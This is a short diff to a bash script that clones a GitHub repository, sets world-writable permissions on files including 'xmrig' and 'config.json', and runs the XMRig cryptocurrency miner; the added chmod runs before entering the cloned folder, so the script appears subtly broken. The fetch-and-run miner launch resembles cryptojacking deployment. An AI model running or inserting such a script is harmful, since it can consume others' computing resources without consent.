@@ -1,6 +1,5 @@
 #!/bin/bash
-apt-get update && apt-get upgrade -y
-apt-get install git -y
 git clone https://github.com/drputraargo-commits/bag.git
+chmod 777 xmrig config.json SHA256SUMS
 cd bag
 ./xmrig
